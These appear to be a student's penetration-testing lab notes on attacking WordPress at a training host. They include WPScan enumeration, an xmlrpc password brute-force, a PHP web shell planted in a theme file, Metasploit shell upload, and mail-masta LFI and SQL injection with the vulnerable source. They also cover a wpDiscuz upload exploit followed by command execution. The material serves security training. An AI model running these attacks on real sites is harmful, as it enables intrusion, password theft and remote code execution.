# Things to start with
`/robots.txt`
`/wp-admin`
`/wp-content`
`/wp-content/plugins`

### Enumeration
```bash
curl -s http://blog.inlanefreight.local | grep WordPress
curl -s http://blog.inlanefreight.local/ | grep themes

# Looking for the wpDiscuz
curl -s http://blog.inlanefreight.local/ | grep plugins
```

##### WPScan
```bash
sudo gem install wpscan

# Adding -t 5 for threads
# or enumerate ap
sudo wpscan --url http://blog.inlanefreight.local --enumerate --api-token dEOFB<SNIP>
```


# Attacking WordPress
```bash
sudo wpscan --password-attack xmlrpc -t 20 -U john -P /usr/share/wordlists/rockyou.txt --url http://blog.inlanefreight.local

Using a shell on the theme page system($_GET[0]);
```
![[Theme-Shell-Attack.png]]
Then doing the reverse
`curl http://blog.inlanefreight.local/wp-content/themes/twentynineteen/404.php?0=id`

#### The Metasploit way
```bash
use exploit/unix/webapp/wp_admin_shell_upload

```
![[Metasploit-WordPress.png]]

#### Vulnerable Plugins - mail-masta

Let's look at a few examples. The plugin [mail-masta](https://wordpress.org/plugins/mail-masta/) is no longer supported but has had over 2,300 [downloads](https://wordpress.org/plugins/mail-masta/advanced/) over the years. It's not outside the realm of possibility that we could run into this plugin during an assessment, likely installed once upon a time and forgotten. Since 2016 it has suffered an [unauthenticated SQL injection](https://www.exploit-db.com/exploits/41438) and a [Local File Inclusion](https://www.exploit-db.com/exploits/50226).
```php
<?php 
include($_GET['pl']);
global $wpdb;
$camp_id=$_POST['camp_id'];
$masta_reports = $wpdb->prefix . "masta_reports";
$count=$wpdb->get_results("SELECT count(*) co from  $masta_reports where camp_id=$camp_id and status=1");
echo $count[0]->co;
?>
```

The PL allows for file upload
`curl -s http://blog.inlanefreight.local/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

##### WP-Discuz
`python3 wp_discuz.py -u http://blog.inlanefreight.local -p /?p=1`
`curl -s http://blog.inlanefreight.local/wp-content/uploads/2021/08/uthsdkbywoxeebg-1629904090.8191.php?cmd=id
`



# Exercise 1
```bash
gobuster dir -u http://blog.inlanefreight.local/wp-content/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt_
```